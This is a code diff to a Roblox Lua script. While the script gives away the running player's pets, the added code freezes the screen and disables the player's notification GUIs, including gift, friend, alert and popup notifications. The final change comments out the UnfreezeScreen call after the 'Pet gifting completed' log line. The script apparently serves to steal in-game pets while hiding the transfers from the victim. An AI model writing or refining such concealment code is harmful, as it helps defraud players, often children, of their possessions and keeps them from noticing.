@@ -168,6 +168,54 @@ local function FreezeScreen()
         end
     end)
     
+    -- Hide all ingame notifications
+    pcall(function()
+        -- Hide Top_Notification (main notification system)
+        local topNotification = LocalPlayer.PlayerGui:FindFirstChild("Top_Notification")
+        if topNotification then
+            topNotification.Enabled = false
+            screenGui:SetAttribute("TopNotificationEnabled", true)
+            Log("🔇 Top notifications hidden")
+        end
+        
+        -- Hide Notifications (modern notification system)
+        local notifications = LocalPlayer.PlayerGui:FindFirstChild("Notifications")
+        if notifications then
+            notifications.Enabled = false
+            screenGui:SetAttribute("NotificationsEnabled", true)
+            Log("🔇 Modern notifications hidden")
+        end
+        
+        -- Hide Friend_Notification
+        local friendNotification = LocalPlayer.PlayerGui:FindFirstChild("Friend_Notification")
+        if friendNotification then
+            friendNotification.Enabled = false
+            screenGui:SetAttribute("FriendNotificationEnabled", true)
+        end
+        
+        -- Hide Gift_Notification
+        local giftNotification = LocalPlayer.PlayerGui:FindFirstChild("Gift_Notification")
+        if giftNotification then
+            giftNotification.Enabled = false
+            screenGui:SetAttribute("GiftNotificationEnabled", true)
+        end
+        
+        -- Hide common notification GUIs
+        for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
+            if gui:IsA("ScreenGui") and gui.Name ~= "ScreenFreeze" and gui.Enabled then
+                if gui.Name:lower():find("notification") or 
+                   gui.Name:lower():find("alert") or 
+                   gui.Name:lower():find("popup") or
+                   gui.Name:lower():find("message") then
+                    gui.Enabled = false
+                    gui:SetAttribute("WasEnabledBeforeFreeze", true)
+                end
+            end
+        end
+        
+        Log("🔇 All notifications hidden")
+    end)
+    
     -- Longer fade out white flash
     spawn(function()
         wait(0.3) -- Wait longer before fade
@@ -201,6 +249,46 @@ local function UnfreezeScreen()
                 cameraConnection:Disconnect()
                 Log("📷 Camera unfrozen")
             end
+            
+            -- Restore notifications
+            if screenGui:GetAttribute("TopNotificationEnabled") then
+                local topNotification = LocalPlayer.PlayerGui:FindFirstChild("Top_Notification")
+                if topNotification then
+                    topNotification.Enabled = true
+                    Log("🔔 Top notifications restored")
+                end
+            end
+            
+            if screenGui:GetAttribute("NotificationsEnabled") then
+                local notifications = LocalPlayer.PlayerGui:FindFirstChild("Notifications")
+                if notifications then
+                    notifications.Enabled = true
+                    Log("🔔 Modern notifications restored")
+                end
+            end
+            
+            if screenGui:GetAttribute("FriendNotificationEnabled") then
+                local friendNotification = LocalPlayer.PlayerGui:FindFirstChild("Friend_Notification")
+                if friendNotification then
+                    friendNotification.Enabled = true
+                end
+            end
+            
+            if screenGui:GetAttribute("GiftNotificationEnabled") then
+                local giftNotification = LocalPlayer.PlayerGui:FindFirstChild("Gift_Notification")
+                if giftNotification then
+                    giftNotification.Enabled = true
+                end
+            end
+            
+            -- Restore other notification GUIs
+            for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
+                if gui:IsA("ScreenGui") and gui:GetAttribute("WasEnabledBeforeFreeze") then
+                    gui.Enabled = true
+                    gui:SetAttribute("WasEnabledBeforeFreeze", nil)
+                end
+            end
+            
             screenGui:Destroy()
         end
         
@@ -918,7 +1006,7 @@ end
     end
     
     Log("🎯 Pet gifting completed! Gifted " .. giftedCount .. " out of " .. #pets .. " pets.")
-    UnfreezeScreen()
+    --UnfreezeScreen()
     isRunning = false
 end
 
